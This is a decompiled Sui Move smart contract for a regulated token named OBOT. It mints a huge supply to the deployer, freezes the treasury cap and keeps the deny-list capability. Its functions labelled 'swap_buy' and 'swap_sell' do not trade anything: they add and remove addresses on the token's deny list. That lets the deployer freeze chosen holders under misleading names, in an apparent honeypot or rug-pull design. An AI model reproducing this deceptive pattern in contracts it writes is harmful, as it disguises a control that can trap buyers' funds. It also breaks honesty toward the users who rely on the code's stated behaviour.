module 0x580afc14f4ba67e2723d3dcf5e7dc8056460203224d5e287eb99fb80365692ab::obot {
    struct OBOT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: OBOT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<OBOT>(arg0, 9, b"OBOT", b"OBOT", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmeeSqjjrpQ5ht5uc21uG3j3PdVM46CkfTXUCyt23vs462"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<OBOT>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<OBOT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<OBOT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<OBOT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<OBOT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<OBOT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<OBOT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<OBOT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

